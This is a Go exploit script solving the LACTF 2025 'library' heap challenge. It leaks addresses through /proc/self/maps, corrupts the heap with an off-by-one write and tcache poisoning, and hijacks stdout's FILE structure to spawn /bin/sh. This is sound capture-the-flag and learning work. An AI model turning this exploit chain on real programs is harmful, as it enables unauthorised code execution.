// Library was a heap exploitation challenge from LACTF 2025
// The exploit was developed and executed using the brkit library
// Challenge: https://github.com/uclaacm/lactf-archive/tree/394c05e835025d11ff99625ae316652ba397a1ed/2025/pwn/library
// Example: go run main.go ssh lactf library-shourtcut -s 5 -v -V
package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"strconv"
	"strings"

	"gitlab.com/stephen-fox/brkit/bstruct"
	"gitlab.com/stephen-fox/brkit/iokit"
	"gitlab.com/stephen-fox/brkit/libc/glibckit"
	"gitlab.com/stephen-fox/brkit/memory"
	"gitlab.com/stephen-fox/brkit/process"
	"gitlab.com/stephen-fox/brkit/scripting"
)

func main() {
	// SETUP -----------------------------------------------------------------
	proc, args := scripting.ParseExploitArgs(scripting.ParseExploitArgsConfig{
		ProcInfo: process.X86_64Info(),
	})

	library := libraryWrapper{
		proc: proc,
		pm:   memory.PointerMakerForX86_64(),
	}

	// STAGE 1 -----------------------------------------------------------------
	args.Stages.Next("Order 65 books to overflow library variable")

	// order book to read and get the exe address
	book0 := library.orderBook("/proc/self/maps")

	// the last iteration overflows the library variable and overwrites the
	// profile pointer
	for i := 1; i < 64; i++ {
		library.orderBook("buh")
		args.Verbose.Printf("ordered book: %d", i)
	}

	// this writes 0x1a1 at where settings -> profile for the condition in
	// read_book(), this is needed because sendfile() does not like reading
	// /proc/self/maps
	library.orderBook(string(
		iokit.NewPayloadBuilder().
			Uint64(0x1a100000000).
			Build()))

	// making a review of this size makes settings -> comprehension equal fff1
	// to read more bytes from /proc/self/maps
	library.addReviewChunk(book0, 0xFFE0, []byte("bookReview"))

	// read book to get the exe address
	library.readBook(book0)

	exeAddr := library.readExeBaseLeak()
	heapAddr := library.readHeapLeak()
	libcAddr := library.readLibcLeak()
	args.Verbose.Printf("exeAddr: %s", exeAddr.HexString())
	args.Verbose.Printf("heapAddr: %s", heapAddr.HexString())
	args.Verbose.Printf("libcAddr: %s", libcAddr.HexString())

	// STAGE 2 -----------------------------------------------------------------
	args.Stages.Next("Create fake chunk start")

	library.addReviewChunk(7,
		0x48,
		iokit.NewPayloadBuilder().
			Uint64(0x0).
			Uint64(0x291).
			// this value is changed from the other solution method since the
			// address to point to on the heap is different
			// heap base 0x000055555555a000
			// chunk address 0x55555556af90
			Pointer(heapAddr.Offset(0x10F00)).
			Pointer(heapAddr.Offset(0x10F00)).
			Build())

	// STAGE 3 -----------------------------------------------------------------
	args.Stages.Next("Review 5 books")

	library.addReviewChunk(8, 0x100, []byte("book7review"))
	library.addReviewChunk(9, 0x100, []byte("book8review"))
	library.addReviewChunk(11, 0x28, []byte("book10review"))
	library.addReviewChunk(12, 0x4f8, []byte("book11review"))
	library.addReviewChunk(13, 0x28, []byte("book12review"))

	// STAGE 4 ----------------------------------------------------------------
	args.Stages.Next("Free book for off-by-one payload")

	library.freeReviewChunk(11)

	// STAGE 5 ----------------------------------------------------------------
	args.Stages.Next("Write off by one payload")

	// payload will fill the chunk, place a 0x290 fake chunk size and overwrite
	// the flags of the next chunk, making it think the previous chunk is free
	library.addReviewChunk(11, 0x28,
		iokit.NewPayloadBuilder().
			RepeatBytes([]byte("A"), 0x20).
			Uint64(0x290).
			Build())

	// STAGE 6 ----------------------------------------------------------------
	args.Stages.Next("Free two 0x110 chunks and 0x500 chunk")

	library.freeReviewChunk(9)
	library.freeReviewChunk(8)
	// this free consolidates the chunks up to book 6 fake size
	library.freeReviewChunk(12)

	stdout := libcAddr.Uint64() + 0x002045c0

	// STAGE 7 ----------------------------------------------------------------
	args.Stages.Next("Write mangled stdout pointer into 0x110 fd spot")

	// offset is made to heapAddr so that it is equal to the address of the
	// mangled fd pointer
	mangledAddr := stdout ^ ((heapAddr.Uint64() + 0x10E8D) >> 12)
	// to calculate where the mangled address is pointing to
	// pwndbg> set $heap_base = 0x55555555a000
	// pwndbg> set $fd = 0x000055500000f92a
	// pwndbg> p/x $fd ^ ($heap_base >> 12)

	library.addReviewChunk(10, 0x60,
		iokit.NewPayloadBuilder().
			RepeatUint64(0x0, 7).
			Uint64(0x111).
			Uint64(mangledAddr).
			Build())

	args.Verbose.Printf("stdout: %x", stdout)
	args.Verbose.Printf("mangledAddr: %x", mangledAddr)

	// STAGE 8 ----------------------------------------------------------------
	args.Stages.Next("Write a review of size 0x100 to point next 0x100 to stdout")

	library.addReviewChunk(14, 0x100, []byte("book13review"))

	// STAGE 9 ----------------------------------------------------------------
	args.Stages.Next("Write exploit file structure into stdout")

	fake_vtable := libcAddr.Uint64() + 0x00202228 - 0x18
	stdout_lock := libcAddr.Uint64() + 0x205710
	gadget := libcAddr.Uint64() + 0x1724f0
	system := libcAddr.Uint64() + 0x00058740
	wideData := libcAddr.Uint64() + 0x002037e0

	// file structure hijacking, file stream oriented programming attack
	fs := glibckit.IO_FILE{
		Flags:        0x3b01010101010101, // bypasses sanity checks on the file struct
		IO_read_end:  system,
		IO_write_end: binary.LittleEndian.Uint64([]byte("/bin/sh\x00")), // storing the argument to system()
		IO_save_base: gadget,
		Lock:         stdout_lock,   // must be valid to pass internal checks
		Codecvt:      stdout + 0xb8, // used to calculate offsets
		Wide_data:    wideData,      // used to calculate offsets
		Unused2:      [80]byte{},    // stores the fake vtable pointer
	}

	unknown2 := iokit.NewPayloadBuilder().
		Uint64(0x0).
		Uint64(0x0).
		Uint64(stdout + 0x20).
		Uint64(0x0).
		Uint64(0x0).
		Uint64(0x0).
		Uint64(fake_vtable).
		Build()

	copy(fs.Unused2[:], unknown2)

	buf := bytes.NewBuffer(nil)
	bstruct.ToBytesX86OrExit(bstruct.FieldWriterFn(buf), fs)

	args.Verbose.Printf("%x", unknown2)

	// writes in _IO_2_1_stdout_ region
	// triggers shell when puts gets called in: review_book + 412
	library.addReviewChunk(15, 0x100, buf.Bytes())

	// STAGE 10 ----------------------------------------------------------------
	args.Stages.Next("Got shell!")
	log.Println("here is a shell ༼ つ ◕_◕ ༽つ༼ つ ◕_◕ ༽つ")
	library.proc.InteractiveOrExit()
}

type libraryWrapper struct {
	proc *process.Process
	pm   memory.PointerMaker
}

func (o libraryWrapper) orderBook(name string) int {
	// if name is > 15 the excess input gets left behind and is used in the next
	// menu selection
	if len(name) > 15 {
		log.Panicf("name must be less than 15 characters to satisfy read() size in order_book()")
	}

	o.proc.WriteAfter([]byte("choice:"), []byte("1\x00"))

	bookIDLine := o.proc.ReadLineOrExit()

	// parsing line "ordering book with id: 0"
	bookIDLineArray := bytes.Split(bookIDLine, []byte("ordering book with id: "))
	bookIDBytes := bytes.TrimSpace(bookIDLineArray[1])
	bookID, err := strconv.Atoi(string(bookIDBytes))
	if err != nil {
		log.Fatalln("Failed to parse book ID into int:", err)
	}

	o.proc.WriteAfter([]byte("enter name:"), []byte(name))

	o.proc.ReadLineOrExit()

	return bookID
}

func (o libraryWrapper) readBook(id int) {
	o.proc.WriteLineAfter([]byte("choice:"), []byte("2"))
	o.proc.WriteLineAfter([]byte("enter id:"), []byte(strconv.Itoa(id)))
}

func (o libraryWrapper) addReviewChunk(bookID int, length int, review []byte) {
	o.proc.WriteLineAfter([]byte("choice:"), []byte("3"))
	o.proc.WriteLineAfter([]byte("enter id:"), []byte(fmt.Sprintf("%d", bookID)))
	o.proc.WriteLineAfter([]byte("enter review length:"), []byte(fmt.Sprintf("%d", length)))
	o.proc.WriteLineAfter([]byte("enter review:"), review)
}

func (o libraryWrapper) freeReviewChunk(bookID int) {
	o.proc.WriteLineAfter([]byte("choice:"), []byte("3"))
	o.proc.WriteLineAfter([]byte("enter id:"), []byte(fmt.Sprintf("%d", bookID)))
	o.proc.WriteLineAfter([]byte("would you like to delete the current review? [Y/n]"), []byte("Y"))
}

func (o libraryWrapper) readExeBaseLeak() memory.Pointer {
	o.proc.ReadLineOrExit()
	leak := o.proc.ReadLineOrExit()
	parts := bytes.Split(leak, []byte("-"))
	exeBaseAddr := o.pm.FromHexBytesOrExit(parts[0], binary.BigEndian)

	return exeBaseAddr
}

func (o libraryWrapper) readHeapLeak() memory.Pointer {
	leak := o.proc.ReadUntilOrExit([]byte("[heap]"))
	scanner := bufio.NewScanner(bytes.NewReader(leak))
	var heapAddr memory.Pointer
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "[heap]") {
			parts := strings.Split(line, "-")
			heapAddr = o.pm.FromHexBytesOrExit([]byte(parts[0]), binary.BigEndian)

			break
		}
	}

	return heapAddr
}

func (o libraryWrapper) readLibcLeak() memory.Pointer {
	leak := o.proc.ReadUntilOrExit([]byte("hope you enjoyed the read :D"))
	scanner := bufio.NewScanner(bytes.NewReader(leak))
	var libcAddr memory.Pointer
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "libc.so.6") {
			parts := strings.Split(line, "-")
			libcAddr = o.pm.FromHexBytesOrExit([]byte(parts[0]), binary.BigEndian)

			break
		}
	}

	return libcAddr
}
